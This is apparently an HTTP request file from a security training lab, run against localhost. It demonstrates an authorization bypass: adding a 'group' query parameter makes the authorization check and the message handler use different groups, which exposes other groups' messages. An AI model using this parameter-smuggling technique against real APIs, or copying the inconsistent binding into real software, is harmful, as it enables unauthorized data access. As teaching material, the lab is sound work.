@base = http://localhost:8000/ii/authz-binding/example3

### The group authorization check prevents Plankton from accessing the Krusty Krab's messages:
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in 403 Forbidden error:
#
# Forbidden: not a member of the requested group

###

### However, since the @basic_auth_v2 decorator prioritizes the group from the query string
### over the one from the path while building the global context `g.group`, Plankton can present
### different `group` values to the authorization check and to the message retrieval, by adding
### a `group` query parameter with the value of his own group:
GET {{base}}/groups/staff@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]

###

### This vulnerability exists because:
### 1. The decorator sets g.group using query-priority: g.group = "staff@chum-bucket.sea"
### 2. Authorization check uses g.group (passes)
### 3. But the handler uses the path parameter directly: get_group_messages(group)
### 4. Path parameter is "staff@krusty-krab.sea" - binding drift!

GET {{base}}/groups/managers@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
#   }
# ]

###

### The /user/messages endpoint correctly uses g.group consistently
GET {{base}}/user/messages?group=staff@krusty-krab.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy

# Results in 403 Forbidden (as expected, because this endpoint uses g.group correctly):
#
# Forbidden: not a member of the requested group
